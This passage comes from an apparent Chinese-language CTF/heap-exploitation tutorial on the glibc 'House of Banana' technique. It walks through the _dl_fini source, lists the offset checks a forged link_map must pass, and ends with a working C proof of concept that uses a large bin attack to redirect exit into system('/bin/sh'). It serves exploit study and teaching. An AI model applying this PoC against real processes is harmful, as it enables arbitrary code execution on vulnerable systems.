*/</span></span><br><span class="line">      __rtld_lock_lock_recursive (<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = <span class="built_in">GL</span>(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">	     copy the pointers in.  */</span></span><br><span class="line">	  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	  <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">	  <span class="built_in">assert</span> (nloaded != <span class="number">0</span> || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="keyword">for</span> (l = <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">	    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">	    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">	      &#123;</span><br><span class="line">		<span class="built_in">assert</span> (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">		   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br><span class="line">	  <span class="built_in">assert</span> (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	  <span class="built_in">assert</span> (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Now we have to do the sorting.  */</span></span><br><span class="line">	  _dl_sort_fini (maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">	     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">	     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">	     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">	     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">	     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">	     lock.  */</span></span><br><span class="line">	  __rtld_lock_unlock_recursive (<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (<span class="built_in">GLRO</span>(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  <span class="built_in">DSO_FILENAME</span> (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  <span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">			    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">DL_CALL_DT_FINI</span></span><br><span class="line">			  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">		  <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">		  <span class="keyword">if</span> (!do_audit &amp;&amp; __builtin_expect (<span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">struct</span> <span class="title class_">audit_ifaces</span> *afct = <span class="built_in">GLRO</span>(dl_audit);</span><br><span class="line">		      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> cnt = <span class="number">0</span>; cnt &lt; <span class="built_in">GLRO</span>(dl_naudit); ++cnt)</span><br><span class="line">			&#123;</span><br><span class="line">			  <span class="keyword">if</span> (afct-&gt;objclose != <span class="literal">NULL</span>)</span><br><span class="line">			    <span class="comment">/* Return value is ignored.  */</span></span><br><span class="line">			    (<span class="type">void</span>) afct-&gt;<span class="built_in">objclose</span> (&amp;l-&gt;l_audit[cnt].cookie);</span><br><span class="line"></span><br><span class="line">			  afct = afct-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">		    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">	      --l-&gt;l_direct_opencount;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (! do_audit &amp;&amp; <span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      do_audit = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> again;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">		      <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">		      <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">		      <span class="built_in">GL</span>(dl_num_relocations),</span><br><span class="line">		      <span class="built_in">GL</span>(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>只要伪造 <code>rtld_global</code> 结构体就可以使得 <code>array</code> 指向我们可控的数据区，从而伪造好一系列函数，进而劫持程序的流。可以触发 <code>call</code> 的有两个点，第一个点可以 <code>call</code> 到很多指针，是一个数组；另一个点就只有一个函数。剩下的工作就是根据代码绕过检测，调用到调用点，需要注意的是，有时候远程的 <code>rtld_global</code> 的偏移与本地不一样，需要爆破。<code>house of  banana</code>便是利用<code>large bin attack</code>往 <code>rtld_global</code> 写入堆的地址，并事先在堆里伪造好<code>rtld_global</code>结构体，这样程序<code>exit</code>或者正常退出 <code>main</code> 函数时，便会执行到伪造的函数，此时若我们将函数伪造成<code>one_gadget</code>或者<code>system</code> 则可以 <code>get shell</code>。</p>
<p><strong>利用思路：</strong></p>
<ul>
<li>直接伪造<code>_rtld_global</code>的<code>_ns_loaded</code>，布局好其他内容，使其调用到<code>fini_array</code></li>
<li>伪造<code>link_map</code>的<code>next</code>指针，布局好其他内容，使其调用到<code>fini_array</code></li>
<li>修改<code>link_map-&gt;l_addr</code>，根据偏移使其调用到指定区域的函数</li>
</ul>
<p><strong>试用场景：</strong></p>
<ul>
<li>程序能够显式的执行 <code>exit</code> 函数</li>
<li>程序通过 <code>libc_start_main</code> 启动的主函数，且主函数能够结束</li>
</ul>
<p><strong>需绕过的点：</strong></p>
<p>劫持<code>&amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) = fake</code>。</p>
<ul>
<li><code>check0</code>：<code>fake+0x28 = fake</code></li>
</ul>
<p><code>maps</code> 必须要有四个元素，所以我劫持的是第三个节点的 <code>next</code> 指针这样不会破环长度从而绕过下面的两个断言。劫持时只需在<code>_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next</code>处写入 <code>fake</code> 就行，这时可以使用 <code>large bin attack</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">assert</span> (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line"><span class="built_in">assert</span> (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>

<p>为了能写入 <code>maps[i] = l;</code>，需要绕过 <code>if (l == l-&gt;l_real)</code>，所以<code>fake+0x28 (offset is 0x28)</code>处要写入 <code>fake</code> 自己的地址。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">ElfW</span>(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    <span class="built_in">ElfW</span>(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l_next, *l_prev; <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l_real;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">assert</span> (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">        maps[i] = l;</span><br><span class="line">        l-&gt;l_idx = i;</span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">            are not dlclose()ed from underneath us.  */</span></span><br><span class="line">        ++l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>check1</code>：<code>glibc_2.23==&gt;fake+0x314 = 0x1c || glibc_2.31==&gt;fake+0x31c = 0x1c</code></li>
</ul>
<p>是个枚举体中成员 <code>l_init_called</code>，由于各版本有所差异，所以还是现查现用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_global:<span class="number">1</span>;	<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_reserved:<span class="number">2</span>;	<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	[...]</span><br><span class="line">	  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	  &#123;</span><br><span class="line">	      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		  &#123;</span><br><span class="line">		  	   <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">		 	   l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>check2&amp;check3</code>：<code>l-&gt;l_info[DT_FINI_ARRAY] != NULL</code></li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	[...]</span><br><span class="line">		       <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		       <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      		|| l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">		       &#123;</span><br><span class="line">		            <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		            <span class="keyword">if</span> (__builtin_expect (<span class="built_in">GLRO</span>(dl_debug_mask)</span><br><span class="line">				    	    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">						_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<span class="built_in">DSO_FILENAME</span> (l-&gt;l_name),ns);</span><br><span class="line"></span><br><span class="line">		      		<span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      		<span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">					&#123;</span><br><span class="line">			  			<span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">			    			(<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    		+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  				<span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    	/ <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">			  			<span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">				    		((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">					&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>控制 <code>array</code> 和 <code>i</code></li>
</ul>
<p>在 <code>fake+0x110</code> 写入的内容会直接控制 <code>array</code>，在 <code>fake+0x120</code> 写入的内容会控制<code>i</code>，只要把<code>fake+0x120，fake+0x110</code> 控制好就可以控制最后的<code>((fini_t) array[i]) ();</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span></span><br><span class="line">&#123;</span><br><span class="line"> [...]</span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">ElfW</span>(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"> [...]   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	[...]</span><br><span class="line">			<span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  <span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">			    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">				<span class="built_in">DL_CALL_DT_FINI</span>(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		    &#125;</span><br><span class="line">	[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要在<code>fake+0x110</code>写入一个 <code>ptr</code>，且 <code>ptr+0x8</code> 处有 <code>ptr2</code>，<code>ptr2</code> 处写入的是最后要执行的函数地址，需要在<code>fake+0x120</code>写入一个<code>ptr</code>，且 <code>ptr+0x8</code> 处是<code>i*8</code>。例如<code>fake+0x110</code>写入<code>fake+0x40</code>，在<code>fake+0x48</code>写入<code>fake+0x58</code>，在<code>fake+0x58</code>写入 <code>shell</code>，在<code>fake+0x120</code>写入<code>fake+0x48</code>，在<code>fake+0x50</code>处写入 <code>8</code>。</p>
<h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a><a class="link"   href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">getLibcBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> to;</span><br><span class="line">    <span class="type">uint64_t</span> from;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>,(<span class="type">int</span>)<span class="built_in">getpid</span>());</span><br><span class="line">    file = <span class="built_in">fopen</span>(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;libc&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">            <span class="built_in">fclose</span>(file);</span><br><span class="line">            <span class="keyword">return</span> from;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libcBase    = <span class="built_in">getLibcBase</span>();</span><br><span class="line">    <span class="comment">// ldBase + 0x2e060</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *	rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得		*	到远程环境的精确偏移</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">uint64_t</span> rtld_global = libcBase + <span class="number">0x23b060</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">    <span class="type">uint64_t</span>* next_node = (<span class="type">uint64_t</span>*)(rtld_global<span class="number">-0x49048</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)p2<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x28</span>)  = fake;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x31c</span>) = <span class="number">0x1c</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x48</span>)  = fake+<span class="number">0x58</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x58</span>)  = (<span class="type">uint64_t</span>)shell;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x50</span>)  = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="type">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);           <span class="comment">//force p1 insert in to the largebin</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    p1[<span class="number">3</span>] = ((<span class="type">uint64_t</span>)next_node <span class="number">-0x20</span>);    <span class="comment">//push p2 into unsoteded bin</span></span><br><span class="line">    <span class="type">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);           <span class="comment">//force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">    p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">3</span>] = fake;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-Emma"><a href="#House-of-Emma" class="headerlink" title="House of Emma"></a>House of Emma</h1><p><code>glibc &gt; 2.23</code>。</p>
